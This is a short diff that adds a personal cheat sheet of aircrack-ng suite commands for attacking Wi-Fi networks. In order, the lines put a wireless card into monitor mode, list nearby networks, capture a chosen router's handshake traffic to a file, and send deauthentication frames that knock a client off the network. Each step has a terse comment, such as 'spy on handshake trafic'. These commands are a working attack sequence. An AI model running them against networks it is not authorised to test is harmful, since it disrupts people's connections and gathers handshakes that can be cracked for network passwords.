@@ -1,0 +1,13 @@
+sudo NetworkManager restart
+
+sudo airmon-ng stop wlan0mon
+------------------------------------
+sudo airmon-ng check kill  -- all process
+
+sudo airmon-ng start wlan0  -- start monitor mode 
+
+sudo airodump-ng wlan0 -- dump all network and trafic 
+
+sudo airodump-ng -c <channel> --bssid <bssid> -w ~/Desktop wlan0  -- spy on handshake trafic (ecap)
+
+sudo aireplay-ng -0 3 -a <bssid> -c <Station> wlan0  -- send deauth message to router
